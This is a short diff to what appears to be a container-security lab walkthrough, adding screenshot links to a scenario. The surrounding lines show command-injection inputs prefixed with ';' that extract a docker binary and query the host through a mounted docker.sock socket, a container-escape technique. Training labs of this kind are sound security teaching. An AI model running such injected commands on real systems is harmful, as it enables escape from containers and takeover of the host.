@@ -16,8 +16,14 @@
 ```bash
 ;tar -xvzf /tmp/docker-19.03.9.tgz -C /tmp/
 ```
+
+![Scenario 2 extract binary](./sc-2-4.png)
+
 * Now we can access the host system by running the following docker commands with passing `docker.sock` UNIX socket
 
 ```bash
 ;/tmp/docker/docker -H unix:///custom/docker/docker.sock images
+```
+
+![Scenario 2 list host images](./sc-2-6.png)
 ```
